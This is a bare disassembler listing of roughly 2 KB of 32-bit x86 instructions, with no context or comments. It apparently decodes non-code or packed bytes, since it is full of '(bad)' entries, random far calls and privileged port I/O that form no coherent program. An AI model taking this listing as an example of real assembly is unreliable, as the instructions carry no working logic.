  44a1f3:	or     al,0xb9
  44a1f5:	xchg   esi,eax
  44a1f6:	mov    ebp,0xab094549
  44a1fb:	xchg   esi,eax
  44a1fc:	cmp    al,BYTE PTR [edx-0x48]
  44a1ff:	mov    al,ds:0xf29b9a29
  44a204:	sub    BYTE PTR [ebp+0x2a],0xc9
  44a208:	in     eax,dx
  44a209:	sbb    bh,BYTE PTR [ebp-0x4e7f443f]
  44a20f:	xor    BYTE PTR [esp+esi*4-0x2146545],cl
  44a216:	or     bh,BYTE PTR [ebp+0x71d19abf]
  44a21c:	cld    
  44a21d:	mov    WORD PTR [eax+0x1a],gs
  44a220:	ins    DWORD PTR es:[edi],dx
  44a221:	mov    ds:0x8d21eb1c,eax
  44a226:	sub    cl,bh
  44a228:	and    eax,0x54e5842a
  44a22d:	sbb    al,0x3f
  44a22f:	inc    eax
  44a230:	repz cld 
  44a232:	call   0x254c781d
  44a237:	in     eax,0xe
  44a239:	in     al,0x6e
  44a23b:	sbb    al,0xf5
  44a23d:	sti    
  44a23e:	push   0xffffffeb
  44a240:	pop    edi
  44a241:	mov    ebp,0x192438e7
  44a246:	sbb    DWORD PTR [edx+0x63c663b8],0xffffffbd
  44a24d:	stos   BYTE PTR es:[edi],al
  44a24e:	sub    ebp,ebx
  44a250:	call   0x1a61:0x55d6fc84
  44a257:	xchg   edx,eax
  44a258:	sbb    al,0x79
  44a25a:	push   0xffffffe8
  44a25c:	inc    eax
  44a25d:	pop    ecx
  44a25e:	repnz jecxz 0x44a287
  44a261:	pushf  
  44a262:	pop    ebx
  44a263:	xlat   BYTE PTR ds:[ebx]
  44a264:	sub    dh,BYTE PTR [ebp+ebx*1-0x35567ab0]
  44a26b:	adc    BYTE PTR [edx],ch
  44a26d:	sub    dh,BYTE PTR [ebp-0x3d8ffa8c]
  44a273:	xchg   ecx,eax
  44a274:	xlat   BYTE PTR ds:[ebx]
  44a275:	ret    
  44a276:	jnp    0x44a252
  44a278:	xor    eax,0xaef46140
  44a27d:	xor    ch,bh
  44a27f:	sysenter 
  44a281:	xchg   ecx,eax
  44a282:	mov    cl,0xb4
  44a284:	pop    eax
  44a285:	push   es
  44a286:	(bad)  [ebp-0x170755bb]
  44a28c:	dec    ebp
  44a28d:	hlt    
  44a28e:	sti    
  44a28f:	aad    0x16
  44a291:	test   eax,0x4ea12c57
  44a296:	pop    esi
  44a297:	into   
  44a298:	mov    ebx,0x750eaba1
  44a29d:	aaa    
  44a29e:	or     edi,0x6bf033b0
  44a2a4:	fisttp DWORD PTR [edx-0x45]
  44a2a7:	aam    0x0
  44a2a9:	jge    0x44a298
  44a2ab:	push   es
  44a2ac:	mov    dx,0xc621
  44a2b0:	and    esi,DWORD PTR [edi]
  44a2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a2b3:	ins    DWORD PTR es:[edi],dx
  44a2b4:	bound  esi,QWORD PTR [edx+0x5]
  44a2b7:	and    ch,bh
  44a2b9:	scas   al,BYTE PTR es:[edi]
  44a2ba:	mov    ebx,0xceed3ef4
  44a2bf:	leave  
  44a2c0:	push   edi
  44a2c1:	js     0x44a29c
  44a2c3:	loopne 0x44a2be
  44a2c5:	or     BYTE PTR [edx+edi*8-0x57],bl
  44a2c9:	and    eax,0x49168eba
  44a2ce:	mov    dl,0x98
  44a2d0:	fs mov ch,0xcc
  44a2d3:	cmp    eax,esp
  44a2d5:	adc    edi,DWORD PTR [ecx+eax*8+0x59f35a77]
  44a2dc:	retf   0x45de
  44a2df:	hlt    
  44a2e0:	sbb    ecx,DWORD PTR [ecx-0x6b]
  44a2e3:	adc    eax,0x14386c57
  44a2e8:	and    ecx,ebx
  44a2ea:	pop    ebx
  44a2eb:	mov    al,0x89
  44a2ed:	mov    BYTE PTR [ecx-0x1b5e6f5f],ch
  44a2f3:	out    dx,al
  44a2f4:	lock pushf 
  44a2f6:	bound  edx,QWORD PTR [ecx+0xe]
  44a2f9:	mov    ebp,0xba7804b7
  44a2fe:	cmp    edi,DWORD PTR [edx-0xd25915b]
  44a304:	mov    bh,0x95
  44a306:	and    BYTE PTR [edi+ebx*1-0x3185e47],ch
  44a30d:	adc    al,0x75
  44a30f:	call   0xc7b93e24
  44a314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a315:	sahf   
  44a316:	xor    al,0xf4
  44a318:	imul   esp,DWORD PTR [edx-0x583ea601],0x5e
  44a31f:	xchg   ah,al
  44a321:	push   cs
  44a322:	mov    dh,0x34
  44a324:	dec    ebp
  44a325:	das    
  44a326:	rcl    BYTE PTR [edi+0x5e6cefd6],1
  44a32c:	fstp   DWORD PTR cs:[ecx-0x45710124]
  44a333:	add    BYTE PTR [ebp-0x45],al
  44a336:	xor    ebp,DWORD PTR [edi]
  44a338:	imul   BYTE PTR [eax]
  44a33a:	mov    edx,0xe49f4fd4
  44a33f:	ins    DWORD PTR es:[edi],dx
  44a340:	data16 (bad) 
  44a342:	iret   
  44a343:	pop    ebp
  44a344:	sub    DWORD PTR [esi+0x4652604e],esp
  44a34a:	xor    al,0x16
  44a34c:	into   
  44a34d:	out    0xb5,al
  44a34f:	je     0x44a30f
  44a351:	cmp    al,0x6
  44a353:	push   eax
  44a354:	xor    eax,0x3cf41d2d
  44a359:	bound  ecx,QWORD PTR [esi+0x14a9236e]
  44a35f:	pop    es
  44a360:	jecxz  0x44a35f
  44a362:	in     al,0x43
  44a364:	push   esi
  44a365:	fwait
  44a366:	pop    ebx
  44a367:	inc    edx
  44a368:	adc    eax,0x2000bb73
  44a36d:	aam    0x95
  44a36f:	mov    dh,0x81
  44a371:	jbe    0x44a32c
  44a373:	xor    al,0x5
  44a375:	ret    0xb06c
  44a378:	push   ss
  44a379:	add    dh,BYTE PTR [eax+eiz*1]
  44a37c:	cmp    DWORD PTR [edi+ebp*1+0x4aa0b142],esp
  44a383:	dec    ebp
  44a384:	sub    ecx,DWORD PTR [ecx]
  44a386:	adc    DWORD PTR [edx-0x6d],edi
  44a389:	pop    ebp
  44a38a:	xor    al,0x19
  44a38c:	sbb    BYTE PTR [esi-0x5168a4c7],dh
  44a392:	lods   eax,DWORD PTR ds:[esi]
  44a393:	jo     0x44a365
  44a395:	(bad)  
  44a396:	xor    dh,BYTE PTR [edx+0x451c97bc]
  44a39c:	jge    0x44a320
  44a39e:	outs   dx,DWORD PTR ds:[esi]
  44a39f:	jne    0x44a3c3
  44a3a1:	loope  0x44a3a4
  44a3a3:	push   ss
  44a3a4:	hlt    
  44a3a5:	idiv   DWORD PTR [eax-0x6936dc03]
  44a3ab:	xchg   ebx,eax
  44a3ac:	push   edi
  44a3ad:	mov    al,0x96
  44a3af:	jmp    0x44a35c
  44a3b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a3b2:	sub    ebx,DWORD PTR [ebp-0x1e]
  44a3b5:	repnz (bad) 
  44a3b7:	pop    eax
  44a3b8:	inc    eax
  44a3b9:	push   edi
  44a3ba:	xchg   esp,eax
  44a3bb:	(bad)  
  44a3bc:	not    DWORD PTR [edx-0x7dd6ab4d]
  44a3c2:	mov    ds:0x2ba0ed99,eax
  44a3c7:	jge    0x44a3d7
  44a3c9:	fdiv   QWORD PTR [edx]
  44a3cb:	jmp    0xf853:0x5203376d
  44a3d2:	mov    ah,0xb4
  44a3d4:	mov    bh,0x97
  44a3d6:	aam    0x74
  44a3d8:	xor    eax,0x4ce6ccfb
  44a3dd:	scas   al,BYTE PTR es:[edi]
  44a3de:	sbb    DWORD PTR [edx-0x342b46d1],edx
  44a3e4:	aas    
  44a3e5:	ja     0x44a416
  44a3e7:	xor    DWORD PTR [edx],esp
  44a3e9:	mov    al,ds:0xf36e291
  44a3ee:	xchg   ebp,eax
  44a3ef:	pop    ss
  44a3f0:	push   ss
  44a3f1:	add    DWORD PTR [edx+0x15],esi
  44a3f4:	sar    DWORD PTR [edi-0x57ce9e4c],cl
  44a3fa:	imul   ecx,eax,0x5a
  44a3fd:	test   al,0xf0
  44a3ff:	sbb    eax,0x8b7b9c7e
  44a404:	out    0x95,al
  44a406:	and    bh,BYTE PTR [ecx-0x7964f64]
  44a40c:	mov    ch,0x6c
  44a40e:	mov    al,0x14
  44a410:	sub    DWORD PTR ds:0xde0586a3,edx
  44a416:	adc    cl,ch
  44a418:	sub    eax,0x1db57fe3
  44a41d:	or     DWORD PTR [ecx+0x4eaf3011],edx
  44a423:	loopne 0x44a3b7
  44a425:	pop    es
  44a426:	sub    al,0xb7
  44a428:	stc    
  44a429:	mov    eax,ds:0x85b158e
  44a42e:	add    dl,BYTE PTR [eax-0x5b12e7b9]
  44a434:	clc    
  44a435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a436:	cmc    
  44a437:	pop    ds
  44a438:	add    al,0x9c
  44a43a:	mov    esi,DWORD PTR [eax+0x17]
  44a43d:	loop   0x44a3ed
  44a43f:	jnp    0x44a3d3
  44a441:	mov    esp,0xd9240538
  44a446:	dec    esp
  44a447:	mov    edx,?
  44a449:	xor    DWORD PTR [esi-0x10],ebx
  44a44c:	sub    DWORD PTR [ebx+edi*2+0x39bce10e],ebx
  44a453:	and    ah,BYTE PTR [edx]
  44a455:	lods   eax,DWORD PTR ds:[esi]
  44a456:	adc    ah,bl
  44a458:	adc    DWORD PTR [edi-0x49],esi
  44a45b:	xor    al,0xb8
  44a45d:	pop    eax
  44a45e:	rcl    BYTE PTR [esi+eax*4-0x40],0xf4
  44a463:	popa   
  44a464:	mov    BYTE PTR [edx],cl
  44a466:	inc    edx
  44a467:	push   ecx
  44a468:	cs cmp eax,0x194fe985
  44a46e:	mov    eax,ds:0x1783d702
  44a473:	gs loop 0x44a41c
  44a476:	inc    edi
  44a477:	outs   dx,DWORD PTR ds:[esi]
  44a478:	test   al,0x24
  44a47b:	mov    dl,0x17
  44a47d:	mov    cl,0x67
  44a47f:	xchg   edi,eax
  44a480:	fisttp QWORD PTR [eax-0xd536b4f]
  44a486:	in     eax,dx
  44a487:	fldenv [ebp+0x4bed0fc4]
  44a48d:	int    0xac
  44a48f:	xor    al,0x21
  44a491:	sub    DWORD PTR [ebx+0x129455b2],ecx
  44a497:	outs   dx,DWORD PTR ds:[esi]
  44a498:	sub    DWORD PTR [ebp+0x320994b],ebx
  44a49e:	push   ds
  44a49f:	out    0xd,al
  44a4a1:	ins    DWORD PTR es:[edi],dx
  44a4a2:	sbb    BYTE PTR [ecx-0x7b0f1b3c],0x1e
  44a4a9:	jne    0x44a522
  44a4ab:	push   edx
  44a4ac:	sbb    DWORD PTR [ebp-0x494b1df5],0xecd3230c
  44a4b6:	hlt    
  44a4b7:	ror    BYTE PTR [ebx],0xf1
  44a4ba:	mov    ebp,0x98cf9604
  44a4bf:	pop    eax
  44a4c0:	pop    es
  44a4c1:	fiadd  DWORD PTR [esi+0x465d354d]
  44a4c7:	in     eax,0x33
  44a4c9:	lods   al,BYTE PTR ds:[esi]
  44a4ca:	push   edi
  44a4cb:	daa    
  44a4cc:	push   ecx
  44a4cd:	add    al,0xbf
  44a4cf:	test   BYTE PTR [ebp-0x7a710dde],dl
  44a4d5:	adc    eax,0x826af2ff
  44a4da:	call   0xffdc:0x22891fdd
  44a4e1:	add    esp,DWORD PTR [edx]
  44a4e3:	or     esp,DWORD PTR [ecx+0x5fcedba1]
  44a4e9:	shl    BYTE PTR [edx],1
  44a4eb:	and    BYTE PTR [ebx],dh
  44a4ed:	mov    eax,ds:0x3e1201e5
  44a4f2:	jo     0x44a4ba
  44a4f4:	mov    ds:0xa274b162,eax
  44a4f9:	pop    esi
  44a4fa:	jae    0x44a56a
  44a4fc:	mov    ch,0x99
  44a4fe:	pusha  
  44a4ff:	xchg   edx,eax
  44a500:	rcr    DWORD PTR [esi+0x4f391c7b],cl
  44a506:	ja     0x44a560
  44a508:	es inc ebp
  44a50a:	push   ebx
  44a50b:	push   cs
  44a50c:	dec    ecx
  44a50d:	int3   
  44a50e:	in     al,0xd4
  44a510:	mov    ah,0xa7
  44a512:	inc    esi
  44a513:	stos   DWORD PTR es:[edi],eax
  44a514:	mov    eax,ds:0x38e21b24
  44a519:	outs   dx,DWORD PTR ds:[esi]
  44a51a:	sbb    esi,DWORD PTR [esi+ebx*4-0x5f]
  44a51e:	jmp    0x44a50c
  44a520:	test   DWORD PTR [ebx+edx*8+0x32c1095d],ebp
  44a527:	das    
  44a528:	xor    eax,0xfb379ddf
  44a52d:	ret    
  44a52e:	mov    dh,0x74
  44a530:	xor    eax,0x5c4dcb9b
  44a535:	adc    dl,bh
  44a537:	imul   ebx,DWORD PTR gs:[ecx+0x2a8a508a],0xffffffb2
  44a53f:	inc    esp
  44a540:	leave  
  44a541:	xor    eax,DWORD PTR [ecx-0x6963ea72]
  44a547:	in     al,dx
  44a548:	dec    ebx
  44a54a:	scas   al,BYTE PTR es:[edi]
  44a54b:	xchg   esi,eax
  44a54c:	add    ch,cl
  44a54e:	jmp    0xdf5634c2
  44a553:	inc    esp
  44a554:	outs   dx,BYTE PTR ds:[esi]
  44a555:	aas    
  44a556:	mov    edi,0xeba426d4
  44a55b:	push   ecx
  44a55c:	xchg   edi,eax
  44a55d:	jp     0x44a5db
  44a55f:	fist   WORD PTR [edi]
  44a561:	adc    ecx,DWORD PTR [ecx-0x425237bb]
  44a567:	xchg   esp,eax
  44a568:	test   DWORD PTR [edx],edx
  44a56a:	sahf   
  44a56b:	leave  
  44a56c:	xchg   esi,eax
  44a56d:	(bad)  
  44a56f:	retf   0x7153
  44a572:	jmp    0x8c1bbcef
  44a577:	xor    DWORD PTR [ebx],edx
  44a579:	fisub  DWORD PTR [eax+0x53]
  44a57c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a57d:	mov    BYTE PTR [ebx-0x4ad2f0ac],ch
  44a583:	push   esp
  44a584:	jno    0x44a5eb
  44a586:	mov    cl,0x78
  44a588:	sbb    BYTE PTR [ecx+0x3d],bl
  44a58b:	xor    eax,0xb471e3a3
  44a590:	(bad)  [ebx]
  44a592:	pushf  
  44a593:	nop
  44a594:	add    al,0x7b
  44a596:	leave  
  44a597:	jl     0x44a530
  44a599:	fnstsw WORD PTR [eax+edx*1-0x3d34623d]
  44a5a0:	mov    eax,ds:0x18f89c11
  44a5a5:	xchg   esp,eax
  44a5a6:	cmpps  xmm2,XMMWORD PTR [edx+esi*8],0x8c
  44a5ab:	out    0x25,al
  44a5ad:	aaa    
  44a5ae:	mov    ebx,0x9bd46c50
  44a5b3:	jo     0x44a5d9
  44a5b5:	in     eax,dx
  44a5b6:	inc    edx
  44a5b7:	popa   
  44a5b8:	and    BYTE PTR [esi+esi*2+0x6291dc6],dl
  44a5bf:	mov    dh,0x0
  44a5c1:	xor    BYTE PTR [esi+0x6b9e765b],cl
  44a5c7:	cwde   
  44a5c8:	mov    ebx,0x68e49bfb
  44a5cd:	sahf   
  44a5ce:	fiadd  WORD PTR [ecx+ebx*4]
  44a5d1:	cwde   
  44a5d2:	mov    eax,0x14469da4
  44a5d7:	les    eax,FWORD PTR [esi]
  44a5d9:	sti    
  44a5da:	or     eax,0x4779be64
  44a5df:	sbb    al,0xc4
  44a5e1:	loopne 0x44a5ca
  44a5e3:	mov    es,WORD PTR [ebp+0x48df3271]
  44a5e9:	push   DWORD PTR [esi+0x2e8403f4]
  44a5ef:	add    dl,ah
  44a5f1:	call   0x15eb:0x92b809eb
  44a5f8:	push   ecx
  44a5f9:	int    0x3b
  44a5fb:	or     ch,ah
  44a5fd:	push   edx
  44a5fe:	mov    cl,0xa4
  44a600:	inc    bx
  44a602:	inc    eax
  44a603:	cs cmc 
  44a605:	push   ss
  44a606:	xchg   ecx,eax
  44a607:	out    dx,al
  44a608:	jmp    0x1f205e69
  44a60d:	or     DWORD PTR [ebp+0x5003c561],esp
  44a613:	jb     0x44a609
  44a615:	push   ss
  44a616:	mov    ebp,0x9b9e36a7
  44a61b:	das    
  44a61c:	mov    ah,0xc9
  44a61e:	inc    edx
  44a61f:	call   0x788:0x45971918
  44a626:	or     eax,DWORD PTR [edi-0x416cf4c4]
  44a62c:	jne    0x44a642
  44a62e:	and    eax,0x40d019f0
  44a633:	xchg   BYTE PTR [edi],bl
  44a635:	or     DWORD PTR [edx],eax
  44a637:	sbb    ebx,DWORD PTR ss:[edi*1-0x1c9dcddb]
  44a63f:	pushf  
  44a640:	inc    esi
  44a641:	or     dh,BYTE PTR [ebp+eax*8+0x17]
  44a645:	fisttp WORD PTR [esi]
  44a647:	retf   0x5ffc
  44a64a:	mov    ds:0x1a992364,eax
  44a64f:	inc    ebx
  44a650:	mov    cs:0x8ea23033,eax
  44a656:	ins    BYTE PTR es:[edi],dx
  44a657:	loope  0x44a6a6
  44a659:	xchg   edx,eax
  44a65a:	jle    0x44a5f5
  44a65c:	dec    esi
  44a65d:	dec    edi
  44a65e:	loope  0x44a670
  44a660:	popf   
  44a661:	push   0x39
  44a663:	push   cs
  44a664:	mov    bh,0xdb
  44a666:	mov    bh,0x54
  44a668:	scas   al,BYTE PTR es:[edi]
  44a669:	jmp    0x44a658
  44a66b:	repnz (bad) 
  44a66d:	mov    ds:0xb235935c,al
  44a672:	pop    ebx
  44a673:	adc    ebp,esp
  44a675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a676:	xor    BYTE PTR [edi],bl
  44a678:	arpl   WORD PTR [edi],cx
  44a67a:	aad    0x6e
  44a67c:	xchg   esi,eax
  44a67d:	xor    DWORD PTR [ecx-0x44f116aa],edx
  44a683:	cmp    al,0x90
  44a685:	inc    esp
  44a686:	cli    
  44a687:	das    
  44a688:	pop    ecx
  44a689:	leave  
  44a68a:	push   es
  44a68b:	in     al,0xd5
  44a68d:	push   edx
  44a68e:	jmp    0xd24b4547
  44a693:	xor    al,0x17
  44a695:	test   eax,0xe7fbc7a6
  44a69a:	sub    eax,0x5ba40da3
  44a69f:	dec    eax
  44a6a0:	or     ch,BYTE PTR [edx]
  44a6a2:	xchg   ebp,eax
  44a6a3:	gs jg  0x44a6f4
  44a6a6:	xlat   BYTE PTR ds:[ebx]
  44a6a7:	xchg   esp,eax
  44a6a8:	sub    al,0x9c
  44a6aa:	mov    esp,0x9ccc6314
  44a6af:	loope  0x44a6c6
  44a6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a6b2:	gs out 0xa1,al
  44a6b5:	into   
  44a6b6:	dec    edx
  44a6b7:	jbe    0x44a6b3
  44a6b9:	imul   ebp,DWORD PTR [ebp-0x1e5b905a],0x7de08d0e
  44a6c3:	(bad)  
  44a6c4:	jbe    0x44a65f
  44a6c6:	popf   
  44a6c7:	or     al,0xbd
  44a6c9:	in     al,dx
  44a6ca:	out    dx,eax
  44a6cb:	aam    0xe3
  44a6cd:	mov    BYTE PTR [edx-0x7e51730],bh
  44a6d3:	inc    esi
  44a6d4:	pop    edi
  44a6d5:	jmp    0x44a694
  44a6d7:	inc    esp
  44a6d8:	ret    0xeba4
  44a6db:	jle    0x44a681
  44a6dd:	sub    esp,DWORD PTR [ecx]
  44a6df:	push   ebp
  44a6e0:	inc    esi
  44a6e1:	shr    ebx,1
  44a6e3:	fisttp WORD PTR [esp+edi*8-0x46]
  44a6e7:	xchg   BYTE PTR fs:[eax-0x12a93069],al
  44a6ee:	adc    esp,DWORD PTR [ebx]
  44a6f0:	fs popa 
  44a6f2:	dec    esp
  44a6f3:	jno    0x44a72a
  44a6f5:	idiv   BYTE PTR ds:0xc71d37a2
  44a6fb:	je     0x44a756
  44a6fd:	mov    ds:0x9e1c2a88,eax
  44a702:	mov    ebx,0x3279c3b1
  44a707:	aam    0x12
  44a709:	add    ebx,DWORD PTR [esi+eax*2+0x75a0fbb5]
  44a710:	cmp    al,0x9
  44a712:	loop   0x44a715
  44a714:	sbb    DWORD PTR [ebp-0x7b],edi
  44a717:	cmp    ah,BYTE PTR [ebx-0x39c345d]
  44a71d:	lea    eax,[ebx]
  44a71f:	sub    edx,esp
  44a721:	sbb    cl,BYTE PTR [edx-0x67]
  44a724:	or     ch,bl
  44a726:	lds    esp,FWORD PTR [ecx+edx*4+0xe55cd00]
  44a72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a72e:	mov    ebx,0x7f26bdd3
  44a733:	popf   
  44a734:	test   DWORD PTR [edi-0x3bea004b],edx
  44a73a:	mov    bl,0xd4
  44a73c:	and    eax,0x8518413c
  44a741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a742:	shr    dh,cl
  44a744:	fs inc esi
  44a746:	or     al,0x9
  44a748:	iret   
  44a749:	mov    WORD PTR [ebp-0x275f42ec],cs
  44a74f:	call   0xc932a81d
  44a754:	adc    eax,0xeeeb4a8b
  44a759:	fidivr DWORD PTR [esi+eax*8]
  44a75c:	sbb    DWORD PTR [ecx],ebp
  44a75e:	mov    eax,ds:0x84eef5be
  44a763:	outs   dx,BYTE PTR ds:[esi]
  44a764:	fisub  DWORD PTR [ebp+0x2e0b4e1b]
  44a76a:	mov    WORD PTR [ecx+ebp*8+0x152ded04],fs
  44a771:	mov    ds:0x84e4c4ba,al
  44a776:	and    ch,dl
  44a778:	js     0x44a73b
  44a77a:	mov    BYTE PTR [eax+0x5e35f556],ch
  44a780:	mov    edi,0xaaf3c094
  44a785:	lods   al,BYTE PTR ds:[esi]
  44a786:	jne    0x44a79d
  44a788:	mov    dh,0xd2
  44a78a:	ret    0x4d1a
  44a78d:	sbb    dh,BYTE PTR [edi-0x79]
  44a790:	pop    esi
  44a791:	cld    
  44a792:	popf   
  44a793:	jge    0x44a721
  44a795:	cdq    
  44a796:	fist   DWORD PTR [esi+0x2f36bce2]
  44a79c:	and    cl,ch
  44a79e:	cdq    
  44a79f:	push   ds
  44a7a0:	mov    ch,0xec
  44a7a2:	and    DWORD PTR [edi],0xfffffff4
  44a7a5:	or     edx,0xee8b35ab
  44a7ab:	in     eax,dx
  44a7ac:	cmc    
  44a7ad:	sbb    DWORD PTR [edi+0x7b69c851],ecx
  44a7b3:	cs es push ss
  44a7b6:	je     0x44a7f4
  44a7b8:	pop    ds
  44a7b9:	pop    edi
  44a7ba:	std    
  44a7bb:	inc    edi
  44a7bc:	jnp    0x44a765
  44a7be:	mov    ebx,0x42b57931
  44a7c3:	inc    eax
  44a7c4:	pop    ds
  44a7c5:	or     al,0x1a
  44a7c7:	push   0xfb299122
  44a7cc:	lods   eax,DWORD PTR ds:[esi]
  44a7cd:	add    eax,0xa4a2e966
  44a7d2:	sbb    edx,DWORD PTR [esi-0x471cdab4]
  44a7d8:	dec    edx
  44a7d9:	sar    BYTE PTR [ebx+ebp*2],1
  44a7dc:	and    al,dl
  44a7de:	dec    ebx
  44a7df:	cmp    BYTE PTR [ebx-0x6e964bd2],cl
  44a7e5:	jns    0x44a7a2
  44a7e7:	out    dx,eax
  44a7e8:	ss enter 0x5566,0xa8
  44a7ed:	call   0xf0f4:0xe245f21
  44a7f4:	dec    ebx
  44a7f5:	xor    BYTE PTR [eax-0x110a677c],dh
  44a7fb:	mov    esp,0xe70f0565
  44a800:	xlat   BYTE PTR ds:[ebx]
  44a801:	je     0x44a85d
  44a803:	test   BYTE PTR [ecx],0xf8
  44a806:	jae    0x44a843
  44a808:	fdiv   DWORD PTR [esi-0x58]
  44a80b:	jne    0x44a7a2
  44a80d:	sub    DWORD PTR ds:0xa1a809bb,edi
  44a813:	das    
  44a814:	sbb    dl,BYTE PTR [ebp+0x61]
  44a817:	in     eax,0x95
  44a819:	sub    al,dl
  44a81b:	in     eax,0xbf
  44a81d:	add    al,0xc5
  44a81f:	push   ss
  44a820:	dec    edx
  44a821:	and    BYTE PTR [eax+0x17],bh
  44a824:	pop    eax
  44a825:	lds    edi,FWORD PTR [esp+eax*8-0x1e01aa45]
  44a82c:	push   edi
  44a82d:	dec    ebp
  44a82e:	arpl   ax,ax
  44a830:	std    
  44a831:	in     al,0xd
  44a833:	out    0x44,eax
  44a835:	and    al,0x9b
  44a837:	pop    eax
  44a838:	dec    esp
  44a839:	push   0x2c1e4524
  44a83e:	and    esp,DWORD PTR [edx+esi*4-0x67]
  44a842:	sub    edi,edi
  44a844:	ja     0x44a8c1
  44a846:	add    BYTE PTR [ecx-0x6dd0a27b],cl
  44a84c:	lock sbb al,0x32
  44a84f:	inc    eax
  44a850:	xchg   ebp,eax
  44a851:	cmp    BYTE PTR [ebx-0x15],bl
  44a854:	jecxz  0x44a84c
  44a856:	jp     0x44a86f
  44a858:	and    eax,0x10ed2c42
  44a85d:	push   ss
  44a85e:	mov    ds:0xd9e9164e,al
  44a863:	rcl    esp,cl
  44a865:	pushf  
  44a866:	inc    esp
  44a867:	pop    edx
  44a868:	in     eax,dx
  44a869:	in     al,0x7a
  44a86b:	das    
  44a86c:	xchg   BYTE PTR [edx+0x70],al
  44a86f:	rcr    DWORD PTR [edi],1
  44a871:	out    0x5e,eax
  44a873:	retf   0x986c
  44a876:	push   cs
  44a877:	test   eax,0x803b7924
  44a87c:	inc    eax
  44a87d:	add    al,0x32
  44a87f:	test   eax,0xc5aba36b
  44a884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a885:	xor    eax,0x33cf8681
  44a88a:	cld    
  44a88b:	adc    DWORD PTR [ebx],ebx
  44a88d:	and    BYTE PTR [eax+0x1aa235d4],dh
  44a893:	shl    ch,cl
  44a895:	add    DWORD PTR [esi-0x3278715],ebp
  44a89b:	push   esp
  44a89c:	sbb    DWORD PTR [ecx],ebp
  44a89e:	rcl    ebx,1
  44a8a0:	clc    
  44a8a1:	(bad)  
  44a8a2:	pop    DWORD PTR [eax]
  44a8a4:	loop   0x44a841
  44a8a6:	imul   esp,DWORD PTR [eax+0x24],0x35
  44a8aa:	fnsave ds:0x93e6c4aa
  44a8b0:	test   DWORD PTR [edi],ebx
  44a8b2:	ret    
  44a8b3:	test   BYTE PTR [ebx],ah
  44a8b5:	outs   dx,DWORD PTR ds:[esi]
  44a8b6:	jge    0x44a8f0
  44a8b8:	das    
  44a8b9:	mov    dh,0x61
  44a8bb:	jb     0x44a903
  44a8bd:	xor    eax,0xcda6dc08
  44a8c2:	xor    al,BYTE PTR ss:[edi+esi*2]
  44a8c6:	loopne 0x44a90c
  44a8c8:	push   0xffffffbe
  44a8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a8cb:	lock push ss
  44a8cd:	imul   ebx,eax,0x547a5cf3
  44a8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a8d4:	jb     0x44a878
  44a8d6:	fwait
  44a8d7:	and    eax,DWORD PTR [eax-0x1d]
  44a8da:	inc    esp
  44a8db:	retf   
  44a8dc:	jbe    0x44a92f
  44a8de:	sbb    dl,ah
  44a8e0:	dec    esp
  44a8e1:	dec    edx
  44a8e2:	(bad)  [ebp+0x1d]
  44a8e5:	sar    DWORD PTR [edx+0x32da2fc4],cl
  44a8eb:	(bad)  
  44a8ec:	adc    eax,0x8fea6872
  44a8f1:	xchg   DWORD PTR [edx],ebx
  44a8f3:	mov    ebx,0x1514ea08
  44a8f8:	add    ebx,DWORD PTR [edi+edx*4+0x6bb4ad0d]
  44a8ff:	mov    ds:0x3a4b996d,al
  44a904:	popf   
  44a905:	adc    dl,dl
  44a907:	pop    esi
  44a908:	fstp   TBYTE PTR [esi+edi*8-0x47add8e0]
  44a90f:	xchg   esp,eax
  44a910:	or     ah,BYTE PTR [ebp-0x63]
  44a913:	pop    ss
  44a914:	inc    ebp
  44a915:	icebp  
  44a916:	data16 repz arpl WORD PTR [ebx],cx
  44a91a:	push   esi
  44a91b:	hlt    
  44a91c:	sbb    BYTE PTR [ecx+0x5dbe16de],ch
  44a922:	inc    ebx
  44a923:	xchg   ebp,eax
  44a924:	rcr    ch,1
  44a926:	test   eax,0xb66b75da
  44a92b:	call   0x1546c614
  44a930:	and    ebx,DWORD PTR [ecx+0x32317838]
  44a936:	push   edx
  44a937:	enter  0xaaf2,0x9b
  44a93b:	add    DWORD PTR [edi+0x3c],esp
  44a93e:	push   ebx
  44a93f:	cmp    eax,0x38b872c5
  44a944:	mov    bl,0x56
  44a946:	jae    0x44a8f1
  44a948:	ror    DWORD PTR [ecx],cl
  44a94a:	(bad)  
  44a94b:	les    eax,FWORD PTR [eax-0x7e16ebba]
  44a951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a952:	jnp    0x44a987
  44a954:	add    eax,0x4d54c788
  44a959:	jbe    0x44a919
  44a95b:	(bad)  
  44a95c:	leave  
  44a95d:	pusha  
  44a95e:	popf   
  44a95f:	push   esi
  44a960:	jge    0x44a96f
  44a962:	pushf  
  44a963:	dec    ecx
  44a964:	push   ds
  44a965:	dec    ebx
  44a966:	rcl    ch,cl
  44a968:	push   ecx
  44a969:	pop    ecx
  44a96a:	in     eax,dx
  44a96b:	mov    bl,0xf0
  44a96d:	call   0xe921:0x352fd993
  44a974:	sbb    BYTE PTR [ecx],bh
  44a976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a977:	inc    ebx
  44a978:	rcl    DWORD PTR [eax-0x75],0xeb
  44a97c:	ja     0x44a922
  44a97e:	jnp    0x44a949
  44a980:	xor    dl,cl
  44a982:	fwait
  44a983:	sub    cl,BYTE PTR [ecx-0x8]
  44a986:	call   0x91fbe425
  44a98b:	inc    ebp
  44a98c:	repz sub BYTE PTR [eax+0x44951ff8],0x94
  44a994:	xor    eax,0x5ee6a449
  44a999:	fisttp WORD PTR [eax+0x73191c08]
  44a99f:	cdq    
  44a9a0:	arpl   WORD PTR [edi],dx
  44a9a2:	outs   dx,BYTE PTR ds:[esi]
  44a9a3:	adc    eax,DWORD PTR [edx+0x3e8cbba8]
  44a9a9:	clc    
  44a9aa:	cwde   
